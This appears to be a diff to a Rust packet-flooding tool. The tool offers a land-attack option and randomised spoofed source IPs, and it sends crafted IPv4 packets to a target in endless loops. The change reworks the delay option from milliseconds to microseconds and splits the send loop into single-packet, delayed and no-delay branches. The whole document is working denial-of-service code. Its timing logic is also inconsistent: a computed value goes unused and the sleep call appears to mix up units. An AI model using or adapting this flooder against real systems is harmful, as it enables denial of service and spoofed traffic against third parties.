@@ -63,7 +63,7 @@ fn main() {
         .arg(
             Arg::with_name("delay")
                 .short("d")
-                .help("Sleeps the thread for the specified time in ms before sending a new packet (Default: 0ms)")
+                .help("Sleeps the thread for the specified time in μs before sending a new packet (Default: 0μs)")
                 .takes_value(true),
         )
         .arg(Arg::with_name("land-attack").short("l").help("Land Attack"))
@@ -127,7 +127,7 @@ fn main() {
         None => 0,
     };
 
-    let delay_ms = time::Duration::from_millis(delay);
+    let delay_micro = delay * 1000;
 
     if !src_ip.is_unspecified() && random_src == true {
         eprintln!("ERROR: -s and -r flags are mutually exclusive");
@@ -194,7 +194,7 @@ fn main() {
 
     let spin_sleeper = spin_sleep::SpinSleeper::new(100_000_000);
 
-    loop {
+    if single_packet {
         let mut cloned_packet = packet::ipv4::MutableIpv4Packet::new(&mut buffer_clone).unwrap();
         cloned_packet.clone_from(&ipv4_packet);
 
@@ -208,14 +208,44 @@ fn main() {
             cloned_packet.set_source(random_ipv4_addr);
         }
 
-        tx.send_to(cloned_packet, IpAddr::V4(dst_ip));
+        result_ = tx.send_to(cloned_packet, IpAddr::V4(dst_ip));
+    } else if delay_enabled {
+        loop {
+            let mut cloned_packet = packet::ipv4::MutableIpv4Packet::new(&mut buffer_clone).unwrap();
+            cloned_packet.clone_from(&ipv4_packet);
 
-        if single_packet {
-            break;
+            if random_src {
+                let random_ipv4_addr = Ipv4Addr::new(
+                    rng.gen::<u8>(),
+                    rng.gen::<u8>(),
+                    rng.gen::<u8>(),
+                    rng.gen::<u8>(),
+                );
+                cloned_packet.set_source(random_ipv4_addr);
+            }
+
+            result_ = tx.send_to(cloned_packet, IpAddr::V4(dst_ip));
+
+            if delay_enabled {
+                spin_sleeper.sleep_ns(delay * 1000);
+            }
         }
+    } else {
+        loop {
+            let mut cloned_packet = packet::ipv4::MutableIpv4Packet::new(&mut buffer_clone).unwrap();
+            cloned_packet.clone_from(&ipv4_packet);
 
-        if delay_enabled {
-            spin_sleeper.sleep(delay_ms);
+            if random_src {
+                let random_ipv4_addr = Ipv4Addr::new(
+                    rng.gen::<u8>(),
+                    rng.gen::<u8>(),
+                    rng.gen::<u8>(),
+                    rng.gen::<u8>(),
+                );
+                cloned_packet.set_source(random_ipv4_addr);
+            }
+
+            result_ = tx.send_to(cloned_packet, IpAddr::V4(dst_ip));
         }
     }
 }
